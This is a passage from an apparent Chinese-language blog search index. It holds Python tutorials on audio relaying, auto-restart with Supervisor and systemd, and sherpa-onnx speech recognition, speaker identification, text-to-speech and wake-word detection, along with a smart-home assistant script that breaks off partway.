out_worker(): try: with sd.OutputStream(device=self.out_dev, samplerate=out_sr, channels=self.channels, dtype=np.int16, blocksize=None) as ostream: while not self._stop.is_set(): try: buf = q.get(timeout=0.1) buf = (buf * self.out_gain).astype(np.int16) ostream.write(buf) except queue.Empty: pass except Exception as e: if not self._stop.is_set(): print(f\u0026#34;输出设备 {self.out_dev} 异常: {e}\u0026#34;) # 启动输入/输出两个子线程 t_in = threading.Thread(target=in_worker, daemon=True) t_out = threading.Thread(target=out_worker, daemon=True) t_in.start(); t_out.start() t_in.join(); t_out.join() def stop(self): self._stop.set() # ---------- CLI ---------- def parse_link(s): \u0026#34;\u0026#34;\u0026#34;解析 --link 0,3 或者 --link 1,2 这样的参数\u0026#34;\u0026#34;\u0026#34; try: mic, spk = map(int, s.split(\u0026#39;,\u0026#39;)) return mic, spk except Exception: raise argparse.ArgumentTypeError(\u0026#34;格式应为 麦克风编号,喇叭编号\u0026#34;) def main(): parser = argparse.ArgumentParser(description=\u0026#34;多输入多输出对话\u0026#34;) parser.add_argument(\u0026#34;--link\u0026#34;, type=parse_link, action=\u0026#39;append\u0026#39;, help=\u0026#34;指定一条链路 麦克风,喇叭 (可多次)\u0026#34;) parser.add_argument(\u0026#34;--in-gain\u0026#34;, type=float, default=0.30) parser.add_argument(\u0026#34;--out-gain\u0026#34;, type=float, default=0.30) parser.add_argument(\u0026#34;--channels\u0026#34;, type=int, default=1) parser.add_argument(\u0026#34;--blocksize\u0026#34;, type=int, default=1024) args = parser.parse_args() print_all_devices() devs = query_devices() # 如果没有通过命令行指定，则进入交互式选择 links = args.link or [] if not links: print(\u0026#34;请输入链路，格式为 麦克风编号,喇叭编号\u0026#34;) print(\u0026#34;空行结束输入\u0026#34;) while True: line = input(\u0026#34;链路: \u0026#34;).strip() if not line: break try: links.append(parse_link(line)) except Exception as e: print(e) if not links: print(\u0026#34;没有指定链路，退出\u0026#34;) sys.exit(0) # 检查设备有效性 for mic, spk in links: if mic \u0026gt;= len(devs) or spk \u0026gt;= len(devs): print(\u0026#34;设备编号超出范围\u0026#34;) sys.exit(1) if devs[mic][\u0026#39;max_input_channels\u0026#39;] == 0: print(f\u0026#34;{mic} 号设备不是麦克风\u0026#34;) sys.exit(1) if devs[spk][\u0026#39;max_output_channels\u0026#39;] == 0: print(f\u0026#34;{spk} 号设备不是喇叭\u0026#34;) sys.exit(1) # 启动所有链路 threads = [] for mic, spk in links: print(f\u0026#34;启动链路: {mic} → {spk}\u0026#34;) t = Link(in_dev=mic, out_dev=spk, channels=args.channels, blocksize=args.blocksize, in_gain=args.in_gain, out_gain=args.out_gain) t.start() threads.append(t) print(\u0026#34;全部链路已启动，按 Ctrl+C 退出\u0026#34;) try: for t in threads: t.join() except KeyboardInterrupt: print(\u0026#34;\\n正在优雅退出…\u0026#34;) finally: for t in threads: t.stop() print(\u0026#34;已退出\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: main() python3 talk_mimo.py 链路: 0,5 链路: 3,2 # 一次性命令行： python3 talk_mimo.py --link 0,5 --link 3,2 # 带增益： python3 talk_mimo.py --in-gain 0.2 --out-gain 0.15 --link 0,5 --link 3,2 No module named \u0026lsquo;gi\u0026rsquo; sudo apt update sudo apt install python3-gi python3-gi-cairo gir1.2-gtk-3.0 -y 如果还用到了 GStreamer 播放音频、视频 ，可以装：\nsudo apt install python3-gst-1.0 gir1.2-gst-plugins-base-1.0 gir1.2-gstreamer-1.0 -y Python Auto Restart Python 程序在崩溃后自动重启，确保它一直运行不间断。\n方式一：在代码中实现自我重启（推荐用于简单场景） 创建一个守护脚本 watchdog.py，用于监控主程序 your_main_program.py：\nimport time import subprocess while True: print(\u0026#34;启动主程序...\u0026#34;) # 启动主程序 process = subprocess.Popen([\u0026#34;python\u0026#34;, \u0026#34;your_main_program.py\u0026#34;]) # 等待主程序结束 process.wait() print(\u0026#34;主程序崩溃或退出，5秒后重启...\u0026#34;) time.sleep(5) 运行方式：\npython watchdog.py 方式二：使用系统级工具管理自动重启（推荐用于正式部署） 1. 使用 Supervisor（Linux） 安装 Supervisor：\npip install supervisor 创建配置文件 your_supervisord.conf：\n[program:your_program] command=python your_main_program.py autostart=true autorestart=true stderr_logfile=/var/log/your_program.err.log stdout_logfile=/var/log/your_program.out.log 启动 Supervisor：\nsupervisord -c your_supervisord.conf 2. 使用 systemd（Linux 服务方式） 创建 systemd 服务文件 /etc/systemd/system/your_program.service：\n[Unit] Description=My Python Program After=network.target [Service] ExecStart=/usr/bin/python /path/to/your_main_program.py Restart=always RestartSec=5 [Install] WantedBy=multi-user.target 启用并启动服务：\nsudo systemctl daemon-reexec sudo systemctl enable your_program sudo systemctl start your_program ✅ 方式三：在主程序内部捕获异常避免崩溃 也可以在主程序内部加入无限循环和异常捕获：\nwhile True: try: # 主程序逻辑 run_main() except Exception as e: print(f\u0026#34;发生异常：{e}\u0026#34;) print(\u0026#34;3秒后重启...\u0026#34;) time.sleep(3) 总结推荐 场景 推荐方案 本地开发 守护脚本方式 正式部署（Linux） Supervisor 或 systemd 跨平台简易运行 Python 脚本循环启动主程序 ","permalink":"https://qfsyso.github.io/posts/python-audio/","summary":"Python Audio 依赖：pyaudio（底层调用 PortAudio），安装命令\npip install pyaudio recorder.py\n#!/usr/bin/env python3 \u0026#34;\u0026#34;\u0026#34; 极简录音器 运行：python recorder.py 按提示输入文件名、采样率、通道数、位深、录音时长即可 \u0026#34;\u0026#34;\u0026#34; import pyaudio import wave import sys def record_to_wav(out_file: str, sample_rate: int = 16_000, channels: int = 1, chunk: int = 1_024, record_seconds: int = 5, sample_width: int = 2): \u0026#34;\u0026#34;\u0026#34; 将麦克风输入保存为 WAV 文件 :param out_file: 输出文件名，如 demo.wav :param sample_rate: 采样率（Hz） :param channels: 声道数（1=单声道 2=立体声） :param chunk: 每次读取的帧数 :param record_seconds: 录音时长（秒） :param sample_width: 位深（字节数，2=16bit） \u0026#34;\u0026#34;\u0026#34; p = pyaudio.","title":"Python Audio"},{"content":"Sherpa-onnx 提供一个灵活、易用且高性能的语音处理解决方案 项目地址 https://github.com/k2-fsa/sherpa-onnx\nsherpa-onnx 创建虚拟环境 test\u0026gt;python -m venv my-test .\\my-test\\Script\\activate pip install sherpa-onnx set path= D:\\wk2\\asr\\SpeechProcessing\\test\\my-test\\bin;%path% sherpa-onnx # 下载模型 https://k2-fsa.github.io/sherpa/onnx/pretrained_models/online-transducer/zipformer-transducer-models.html bilingual-zh-en-2023-02-20 a.bat # linux sherpa-onnx \\ --tokens=./sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/tokens.txt \\ --encoder=./sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/encoder-epoch-99-avg-1.onnx \\ --decoder=./sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/decoder-epoch-99-avg-1.onnx \\ --joiner=./sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/joiner-epoch-99-avg-1.onnx \\ ./sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/test_wavs/1.wav # win sherpa-onnx ^ --tokens=.\\sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/tokens.txt ^ --encoder=.\\sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/encoder-epoch-99-avg-1.onnx ^ --decoder=.\\sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/decoder-epoch-99-avg-1.onnx ^ --joiner=.\\sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/joiner-epoch-99-avg-1.onnx ^ .\\sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/test_wavs/1.wav win需要执行\nchcp 65001 运行测试\n\u0026gt;.\\a.bat 下载 sherpa-onnx\ngit clone https://github.com/k2-fsa/sherpa-onnx 测试sherpa-onnx\\python-api-examples\\speech-recognition-from-microphone-with-endpoint-detection.py\n安装依赖 pip install sounddevice numpy python .\\sherpa-onnx\\python-api-examples\\speech-recognition-from-microphone-with-endpoint-detection.py ^ --tokens=.\\sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/tokens.txt ^ --encoder=.\\sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/encoder-epoch-99-avg-1.onnx ^ --decoder=.\\sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/decoder-epoch-99-avg-1.onnx ^ --joiner=.\\sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/joiner-epoch-99-avg-1.onnx 执行 .\\a.bat 说话即可读取声音\n也可以用二进制运行\nsherpa-onnx-microphone ^ --tokens=.\\sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/tokens.txt ^ --encoder=.\\sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/encoder-epoch-99-avg-1.onnx ^ --decoder=.\\sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/decoder-epoch-99-avg-1.onnx ^ --joiner=.\\sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/joiner-epoch-99-avg-1.onnx 参考： https://www.bilibili.com/video/BV1Um421V75A # pip install sherpa-onnx # 下载sherpa-onnx源码库 mkdir SpeechProcessing cd test git clone https://github.com/k2-fsa/sherpa-onnx.git ASR程序 下载模型 https://github.com/k2-fsa/sherpa-onnx/releases/tag/speaker-recongition-models\n如 3dspeaker_speech_eres2net_largexxx 可以下载实例语音 https://github.com/csukuangfj/sr-data\n模型是基于 https://github.com/alibaba-damo-academy/3D-Speaker\n制作声纹识别文件 cd test mkdir asr \u0026amp; cd asr 创建speaker.txt文件，在该文件中写入如\nfoo /path/to/a.wav bar /path/to/b.wav 其中foo、bar表示人名，/path/to/a.wav表示foo对应的音频文件。\n一个人名可以使用多个音频文件，这样识别会更准确。\nspeaker.txt\nlihua ./Lihua.wav luo ./Luoxiang.wav luo ./Luoxiang2.wav 下载声纹识别模型 下载网址：https://github.com/k2-fsa/sherpa-onnx/releases/tag/speaker-recongition-models 如下载：wespeaker_zh_cnceleb_resnet34.onnx\n下载ASR模型!! 下载网址：https://huggingface.co/models 搜索 paraformer onnx 找到sherpa-onnx-paraformer-zh-2023-03-28 点击Clone repository , 复制github下载命令，执行该命令\n下载VAD模型 下载网址： https://github.com/snakers4/silero-vad/raw/master/src/silero_vad/data/silero_vad.onnx\n运行程序 (功能：声纹识别+VAD+流式语音识别)\ncd test\n# win bat # testvad.bat python .\\sherpa-onnx\\python-api-examples\\speaker-identification-with-vad-non-streaming-asr.py ^ --paraformer ./sherpa-onnx-paraformer-zh-2023-03-28/model.int8.onnx ^ --tokens .\\sherpa-onnx-paraformer-zh-2023-03-28\\tokens.txt ^ --silero-vad-model=.\\silero_vad.onnx ^ --speaker-file .\\speaker.txt ^ --model .\\3dspeaker_speech_eres2net_large_sv_zh-cn_3dspeaker_16k.onnx # linux.sh python3 ./sherpa-onnx/python-api-examples/speaker-identification-with-vad-non-streaming-asr.py \\ --paraformer ./sherpa-onnx-paraformer-zh-2023-03-28/model.int8.onnx \\ --tokens ./sherpa-onnx-paraformer-zh-2023-03-28/tokens.txt \\ --silero-vad-model=./silero_vad.onnx \\ --speaker-file ./speaker.txt \\ --model ./wespeaker_zh_cnceleb_resnet34.onnx 结果:\nStarted! Please speak 0-unknown: 一二三一二三 1-lihua: 出生在北京 2-lihua: 现在是一名高三的学生 3-unknown: 一二三一二三组成在一起 参考： https://www.bilibili.com/video/BV1uK411e7cN\nTTS程序 1、\t参考地址： https://www.bilibili.com/video/BV1me411Z76F 2、\t下载tts模型 cd test mkdir tts \u0026amp; cd tts https://huggingface.co/csukuangfj 在这个作者下，搜vits-piper-zh_CN-huayan-medium，像ASR模型那样下载即可\n运行程序 cd test # win python .\\sherpa-onnx\\python-api-examples\\offline-tts-play.py ^ --vits-model=.\\tts\\vits-piper-zh_CN-huayan-medium\\zh_CN-huayan-medium.onnx ^ --vits-tokens=.\\tts\\vits-piper-zh_CN-huayan-medium\\tokens.txt ^ --vits-data-dir=.\\tts\\vits-piper-zh_CN-huayan-medium\\espeak-ng-data ^ --output-filename=.\\tts\\output.wav ^ \u0026#34;小米已完成操作\u0026#34; .\\tts.bat # linux python ./sherpa-onnx/python-api-examples/offline-tts-play.py \\ --vits-model=./tts/vits-piper-zh_CN-huayan-medium/zh_CN-huayan-medium.onnx \\ --vits-tokens=./tts/vits-piper-zh_CN-huayan-medium/tokens.txt \\ --vits-data-dir=./tts/vits-piper-zh_CN-huayan-medium/espeak-ng-data \\ --output-filename=./tts/output.wav \\ \u0026#34;小米已完成操作\u0026#34; KWS(唤醒词)程序 模型下载 cd test mkdir kws \u0026amp; cd kws https://k2-fsa.github.io/sherpa/onnx/kws/pretrained_models/index.html\n如：sherpa-onnx-kws-zipformer-wenetspeech\n运行程序 cd test keyword.txt 如\nx iǎo m ǐ x iǎo m ǐ @小米小米 l uò sh í @落实 x iǎo d é x iǎo d é @小德小德 ào t è m àn @奥特曼 声母加韵母\n# win python .\\sherpa-onnx\\python-api-examples\\keyword-spotter-from-microphone.py ^ --tokens .\\sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01\\tokens.txt ^ --encoder .\\sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01\\encoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx ^ --decoder .\\sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01\\decoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx ^ --joiner .\\sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01\\joiner-epoch-99-avg-1-chunk-16-left-64.int8.onnx ^ --keywords-file .\\sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01\\keywords.txt # linux\tpython ./sherpa-onnx/python-api-examples/keyword-spotter-from-microphone.py \\ --tokens ./sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01/tokens.txt \\ --encoder ./sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01/encoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx \\ --decoder ./sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01/decoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx \\ --joiner ./sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01/joiner-epoch-99-avg-1-chunk-16-left-64.int8.onnx \\ --keywords-file ./sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01/keywords.txt 结果\nStarted! Please speak 0: 落实 1: 小德小德 2: 奥特曼 融合 ASR、KWS、TTS程序 语音输入 识别唤醒 语音输出\n注意 win ，linux则要改成 \\\nimport argparse import sys import os from pathlib import Path import numpy as np import sherpa_onnx import sounddevice as sd import threading import queue import time from collections import defaultdict import soundfile as sf from typing import Dict, List # 获取当前脚本所在目录 current_dir = os.path.dirname(os.path.abspath(__file__)) parent_dir = os.path.dirname(current_dir) # 全局变量 wake_word_detected = False asr_text = \u0026#34;\u0026#34; buffer = queue.Queue() started = False stopped = False killed = False event = threading.Event() sample_rate = 24000 # 默认TTS采样率 current_speaker = \u0026#34;unknown\u0026#34; # 添加声纹识别结果存储 def get_relative_path(relative_path): \u0026#34;\u0026#34;\u0026#34;将相对路径转换为绝对路径\u0026#34;\u0026#34;\u0026#34; return os.path.join(parent_dir, relative_path) def load_speaker_embedding_model(model_path): config = sherpa_onnx.SpeakerEmbeddingExtractorConfig( model=model_path, num_threads=1, debug=False, provider=\u0026#34;cpu\u0026#34;, ) if not config.validate(): raise ValueError(f\u0026#34;Invalid config. {config}\u0026#34;) return sherpa_onnx.SpeakerEmbeddingExtractor(config) def load_speaker_file(speaker_file_path) -\u0026gt; Dict[str, List[str]]: if not Path(speaker_file_path).is_file(): raise ValueError(f\u0026#34;Speaker file {speaker_file_path} does not exist\u0026#34;) ans = defaultdict(list) with open(speaker_file_path) as f: for line in f: line = line.strip() if not line: continue fields = line.split() if len(fields) != 2: raise ValueError(f\u0026#34;Invalid line: {line}. Fields: {fields}\u0026#34;) speaker_name, filename = fields ans[speaker_name].append(filename) return ans def compute_speaker_embedding(filenames: List[str], extractor) -\u0026gt; np.ndarray: assert len(filenames) \u0026gt; 0, \u0026#34;filenames is empty\u0026#34; ans = None for filename in filenames: samples, sample_rate = sf.read( filename, always_2d=True, dtype=\u0026#34;float32\u0026#34;, ) samples = samples[:, 0] # use only the first channel samples = np.ascontiguousarray(samples) stream = extractor.create_stream() stream.accept_waveform(sample_rate=sample_rate, waveform=samples) stream.input_finished() assert extractor.is_ready(stream) embedding = extractor.compute(stream) embedding = np.array(embedding) if ans is None: ans = embedding else: ans += embedding return ans / len(filenames) def init_speaker_identification(): # 设置声纹识别模型路径 speaker_model = get_relative_path(\u0026#34;D:/wk2/asr/SpeechProcessing/test/wespeaker_zh_cnceleb_resnet34.onnx\u0026#34;) speaker_file = get_relative_path(\u0026#34;D:/wk2/asr/SpeechProcessing/test/speaker.txt\u0026#34;) extractor = load_speaker_embedding_model(speaker_model) speaker_data = load_speaker_file(speaker_file) manager = sherpa_onnx.SpeakerEmbeddingManager(extractor.dim) for name, filename_list in speaker_data.items(): embedding = compute_speaker_embedding( filenames=filename_list, extractor=extractor, ) status = manager.add(name, embedding) if not status: raise RuntimeError(f\u0026#34;Failed to register speaker {name}\u0026#34;) return extractor, manager def wake_word_detection(): global wake_word_detected, killed # 设置KWS模型路径 kws_dir = get_relative_path(\u0026#34;D:/wk2/asr/SpeechProcessing/test/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01\u0026#34;) keyword_spotter = sherpa_onnx.KeywordSpotter( tokens=get_relative_path(\u0026#34;D:/wk2/asr/SpeechProcessing/test/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01/tokens.txt\u0026#34;), encoder=get_relative_path(\u0026#34;D:/wk2/asr/SpeechProcessing/test/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01/encoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx\u0026#34;), decoder=get_relative_path(\u0026#34;D:/wk2/asr/SpeechProcessing/test/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01/decoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx\u0026#34;), joiner=get_relative_path(\u0026#34;D:/wk2/asr/SpeechProcessing/test/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01/joiner-epoch-99-avg-1-chunk-16-left-64.int8.onnx\u0026#34;), num_threads=1, max_active_paths=4, keywords_file=get_relative_path(\u0026#34;D:/wk2/asr/SpeechProcessing/test/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01/keywords.txt\u0026#34;), keywords_score=1.0, keywords_threshold=0.25, num_trailing_blanks=1, provider=\u0026#34;cpu\u0026#34;, ) print(\u0026#34;等待唤醒词...\u0026#34;) stream = keyword_spotter.create_stream() sample_rate = 16000 samples_per_read = int(0.1 * sample_rate) with sd.InputStream(channels=1, dtype=\u0026#34;float32\u0026#34;, samplerate=sample_rate) as s: while not wake_word_detected and not killed: samples, _ = s.read(samples_per_read) samples = samples.reshape(-1) stream.accept_waveform(sample_rate, samples) while keyword_spotter.is_ready(stream): keyword_spotter.decode_stream(stream) result = keyword_spotter.get_result(stream) if result: print(f\u0026#34;检测到唤醒词: {result}\u0026#34;) wake_word_detected = True keyword_spotter.reset_stream(stream) break def speech_recognition(extractor, speaker_manager): global asr_text, killed, current_speaker # 设置ASR模型路径 recognizer = sherpa_onnx.OfflineRecognizer.from_paraformer( paraformer=get_relative_path(\u0026#34;D:/wk2/asr/SpeechProcessing/test/sherpa-onnx-paraformer-zh-2023-03-28/model.int8.onnx\u0026#34;), tokens=get_relative_path(\u0026#34;D:/wk2/asr/SpeechProcessing/test/sherpa-onnx-paraformer-zh-2023-03-28/tokens.txt\u0026#34;), num_threads=1, sample_rate=16000, feature_dim=80, decoding_method=\u0026#34;greedy_search\u0026#34;, debug=False, ) # 设置VAD vad_config = sherpa_onnx.VadModelConfig() vad_config.silero_vad.model = get_relative_path(\u0026#34;silero_vad.onnx\u0026#34;) vad_config.silero_vad.min_silence_duration = 0.5 vad_config.silero_vad.min_speech_duration = 0.5 vad_config.sample_rate = 16000 vad = sherpa_onnx.VoiceActivityDetector(vad_config, buffer_size_in_seconds=100) window_size = vad_config.silero_vad.window_size print(\u0026#34;请说出您的指令...\u0026#34;) samples_per_read = int(0.1 * 16000) audio_buffer = [] with sd.InputStream(channels=1, dtype=\u0026#34;float32\u0026#34;, samplerate=16000) as s: while not killed: samples, _ = s.read(samples_per_read) samples = samples.reshape(-1) audio_buffer = np.concatenate([audio_buffer, samples]) while len(audio_buffer) \u0026gt; window_size: vad.accept_waveform(audio_buffer[:window_size]) audio_buffer = audio_buffer[window_size:] while not vad.empty(): if len(vad.front.samples) \u0026lt; 0.5 * 16000: vad.pop() continue # 声纹识别 stream = extractor.create_stream() stream.accept_waveform(sample_rate=16000, waveform=vad.front.samples) stream.input_finished() embedding = np.array(extractor.compute(stream)) current_speaker = speaker_manager.search(embedding, threshold=0.6) if not current_speaker: current_speaker = \u0026#34;unknown\u0026#34; print(f\u0026#34;识别到说话人: {current_speaker}\u0026#34;) # ASR识别 asr_stream = recognizer.create_stream() asr_stream.accept_waveform(sample_rate=16000, waveform=vad.front.samples) recognizer.decode_stream(asr_stream) asr_text = asr_stream.result.text print(f\u0026#34;识别结果: {asr_text} (说话人: {current_speaker})\u0026#34;) vad.pop() return def tts_synthesis(text): global sample_rate, started, stopped, killed # 设置TTS模型路径 tts_config = sherpa_onnx.OfflineTtsConfig( model=sherpa_onnx.OfflineTtsModelConfig( vits=sherpa_onnx.OfflineTtsVitsModelConfig( model=get_relative_path(\u0026#34;D:/wk2/asr/SpeechProcessing/test/vits-piper-zh_CN-huayan-medium/zh_CN-huayan-medium.onnx\u0026#34;), tokens=get_relative_path(\u0026#34;D:/wk2/asr/SpeechProcessing/test/vits-piper-zh_CN-huayan-medium/tokens.txt\u0026#34;), data_dir=get_relative_path(\u0026#34;D:/wk2/asr/SpeechProcessing/test/vits-piper-zh_CN-huayan-medium/espeak-ng-data\u0026#34;), ), provider=\u0026#34;cpu\u0026#34;, debug=False, num_threads=1, ), max_num_sentences=1, ) tts = sherpa_onnx.OfflineTts(tts_config) sample_rate = tts.sample_rate play_back_thread = threading.Thread(target=play_audio) play_back_thread.start() tts.generate( text, sid=0, speed=1.0, callback=generated_audio_callback, ) stopped = True play_back_thread.join() def generated_audio_callback(samples: np.ndarray, progress: float): global started buffer.put(samples) if not started: started = True return 0 if killed else 1 def play_audio_callback(outdata: np.ndarray, frames: int, time, status: sd.CallbackFlags): if killed or (started and buffer.empty() and stopped): event.set() if buffer.empty(): outdata.fill(0) return n = 0 while n \u0026lt; frames and not buffer.empty(): remaining = frames - n k = buffer.queue[0].shape[0] if remaining \u0026lt;= k: outdata[n:, 0] = buffer.queue[0][:remaining] buffer.queue[0] = buffer.queue[0][remaining:] n = frames if buffer.queue[0].shape[0] == 0: buffer.get() break outdata[n:n+k, 0] = buffer.get() n += k if n \u0026lt; frames: outdata[n:, 0] = 0 def play_audio(): with sd.OutputStream( channels=1, callback=play_audio_callback, dtype=\u0026#34;float32\u0026#34;, samplerate=sample_rate, blocksize=1024, ): event.wait() def main(): try: # 初始化声纹识别 print(\u0026#34;\\n正在初始化声纹识别...\u0026#34;) extractor, speaker_manager = init_speaker_identification() # 第一步：唤醒词检测 wake_word_detection() if wake_word_detected: # 第二步：语音识别（带VAD和声纹识别） speech_recognition(extractor, speaker_manager) if asr_text: # 第三步：TTS合成 # 从keywords.txt中获取唤醒词名称 keywords_file = get_relative_path(\u0026#34;D:/wk2/asr/SpeechProcessing/test/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01/keywords.txt\u0026#34;) try: with open(keywords_file, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: wake_word = f.readline().strip() wake_word = wake_word.split()[0] # 取第一个词作为唤醒词名称 except: wake_word = \u0026#34;小爱同学\u0026#34; response_text = f\u0026#34;{wake_word}已完成操作。当前用户是{current_speaker}\u0026#34; tts_synthesis(response_text) except KeyboardInterrupt: print(\u0026#34;\\n程序已终止\u0026#34;) global killed killed = True sys.exit(0) if __name__ == \u0026#34;__main__\u0026#34;: main() python smart_home2.py 即可通过唤醒词与机器沟通\n程序运行时的资源消耗： 内存消耗400-500M 程序运行时的CPU消耗： 2核2G 占用25%\n结合关键词/大模型 #!/usr/bin/env python3 \u0026#34;\u0026#34;\u0026#34; 唤醒词 + ASR(含 VAD \u0026amp; 声纹) + 拼音关键词匹配 + Qwen2.5-0.5B 对话 \u0026#34;\u0026#34;\u0026#34; import argparse import sys import os import json from pathlib import Path import numpy as np import sherpa_onnx import sounddevice as sd import threading import queue import time from collections import defaultdict import soundfile as sf from typing import Dict, List, Optional, Tuple # === 新增：拼音匹配所需库 === from pypinyin import lazy_pinyin from fuzzywuzzy import fuzz # === 新增：大模型 === import torch from transformers import AutoTokenizer, AutoModelForCausalLM # ------------------ 路径工具 ------------------ current_dir = os.path.dirname(os.path.abspath(__file__)) parent_dir = os.path.dirname(current_dir) def get_relative_path(relative_path: str) -\u0026gt; str: return os.path.join(parent_dir, relative_path) # ------------------ 关键词配置 ------------------ KEYWORD2ID = {\u0026#34;空调\u0026#34;: 1, \u0026#34;电视\u0026#34;: 2, \u0026#34;风扇\u0026#34;: 3, \u0026#34;卧室灯\u0026#34;: 4, \u0026#34;客厅灯\u0026#34;: 5} def fuzzy_match(text: str) -\u0026gt; Tuple[Optional[str], int]: \u0026#34;\u0026#34;\u0026#34;返回匹配到的关键词与 id；未命中返回 None,0\u0026#34;\u0026#34;\u0026#34; txt_py = \u0026#34;\u0026#34;.join(lazy_pinyin(text)) for kw, kid in KEYWORD2ID.items(): if fuzz.partial_ratio(\u0026#34;\u0026#34;.join(lazy_pinyin(kw)), txt_py) \u0026gt;= 70: return kw, kid return None, 0 # ------------------ 大模型初始化 ------------------ QWEN_PATH = get_relative_path(\u0026#34;/root/test/models/qwen2.5-0.5b\u0026#34;) tok = AutoTokenizer.from_pretrained(QWEN_PATH, trust_remote_code=True) chat_model = AutoModelForCausalLM.from_pretrained( \u0026#34;Qwen/Qwen2.5-0.5B\u0026#34;, cache_dir=\u0026#34;/root/test/models\u0026#34;, torch_dtype=\u0026#34;auto\u0026#34;, device_map=\u0026#34;auto\u0026#34; ) def qwen_chat(prompt: str) -\u0026gt; str: msgs = [{\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: prompt}] text = tok.apply_chat_template(msgs, tokenize=False, add_generation_prompt=True) inputs = tok(text, return_tensors=\u0026#34;pt\u0026#34;) with torch.no_grad(): out = chat_model.generate( **inputs, max_new_tokens=64, do_sample=True, temperature=0.7 ) return tok.decode(out[0][len(inputs.input_ids[0]):], skip_special_tokens=True).strip() # ------------------ 声纹相关 ------------------ def load_speaker_embedding_model(model_path: str): config = sherpa_onnx.SpeakerEmbeddingExtractorConfig( model=model_path, num_threads=1, debug=False, provider=\u0026#34;cpu\u0026#34;, ) if not config.validate(): raise ValueError(f\u0026#34;Invalid config. {config}\u0026#34;) return sherpa_onnx.SpeakerEmbeddingExtractor(config) def load_speaker_file(speaker_file_path: str) -\u0026gt; Dict[str, List[str]]: ans = defaultdict(list) with open(speaker_file_path) as f: for line in f: line = line.strip() if not line: continue fields = line.split() if len(fields) != 2: raise ValueError(f\u0026#34;Invalid line: {line}\u0026#34;) speaker_name, filename = fields ans[speaker_name].append(filename) return ans def compute_speaker_embedding(filenames: List[str], extractor) -\u0026gt; np.ndarray: ans = None for filename in filenames: samples, sr = sf.read(filename, always_2d=True, dtype=\u0026#34;float32\u0026#34;) samples = samples[:, 0] samples = np.ascontiguousarray(samples) stream = extractor.create_stream() stream.accept_waveform(sr, samples) stream.input_finished() embedding = np.array(extractor.compute(stream)) if ans is None: ans = embedding else: ans += embedding return ans / len(filenames) def init_speaker_identification(): speaker_model = get_relative_path(\u0026#34;/root/test/wespeaker_zh_cnceleb_resnet34.onnx\u0026#34;) speaker_file = get_relative_path(\u0026#34;/root/test/speaker.txt\u0026#34;) extractor = load_speaker_embedding_model(speaker_model) speaker_data = load_speaker_file(speaker_file) manager = sherpa_onnx.SpeakerEmbeddingManager(extractor.dim) for name, filelist in speaker_data.items(): emb = compute_speaker_embedding(filelist, extractor) status = manager.add(name, emb) if not status: raise RuntimeError(f\u0026#34;Failed to register speaker {name}\u0026#34;) return extractor, manager # ------------------ 唤醒词 ------------------ def wake_word_detection() -\u0026gt; bool: kws_dir = get_relative_path(\u0026#34;/root/test/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01\u0026#34;) keyword_spotter = sherpa_onnx.KeywordSpotter( tokens=os.path.join(kws_dir, \u0026#34;tokens.txt\u0026#34;), encoder=os.path.join(kws_dir, \u0026#34;encoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx\u0026#34;), decoder=os.path.join(kws_dir, \u0026#34;decoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx\u0026#34;), joiner=os.path.join(kws_dir, \u0026#34;joiner-epoch-99-avg-1-chunk-16-left-64.int8.onnx\u0026#34;), num_threads=1, max_active_paths=4, keywords_file=os.path.join(kws_dir, \u0026#34;keywords.txt\u0026#34;), keywords_score=1.0, keywords_threshold=0.25, num_trailing_blanks=1, provider=\u0026#34;cpu\u0026#34;, ) print(\u0026#34;等待唤醒词...\u0026#34;) stream = keyword_spotter.create_stream() sr = 16000 chunk = int(0.1 * sr) with sd.InputStream(channels=1, dtype=\u0026#34;float32\u0026#34;, samplerate=sr) as s: while True: samples, _ = 